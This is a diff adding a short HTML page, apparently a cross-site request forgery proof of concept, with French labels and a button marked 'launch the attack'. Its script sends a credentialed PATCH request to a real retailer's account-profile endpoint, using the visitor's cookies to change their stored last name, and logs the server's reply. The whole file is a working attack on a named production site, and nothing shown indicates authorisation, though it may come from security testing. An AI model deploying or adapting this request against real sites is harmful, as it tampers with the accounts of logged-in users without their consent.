@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Test Button</title>
+  </head>
+  <body>
+    <h2>CSRF Test via Bouton</h2>
+    <button onclick="envoyerRequete()">Lancer l’attaque</button>
+
+    <script>
+      function envoyerRequete() {
+        console.log("Tentative de CSRF en cours...");
+
+        fetch("https://accounts.decathlon.com/myaccount_bff/members/me/profile/identity", {
+          method: "PATCH",
+          credentials: "include", // pour envoyer les cookies
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ lastname: "IkramCSRF" })
+        })
+        .then(res => {
+          console.log("Code HTTP :", res.status);
+          return res.text();
+        })
+        .then(data => {
+          console.log("Réponse brute :", data);
+          alert("Requête terminée ! Voir la console.");
+        })
+        .catch(err => {
+          console.error("Erreur CORS ou réseau :", err);
+          alert("Erreur bloquante. Voir la console.");
+        });
+      }
+    </script>
+  </body>
+</html>
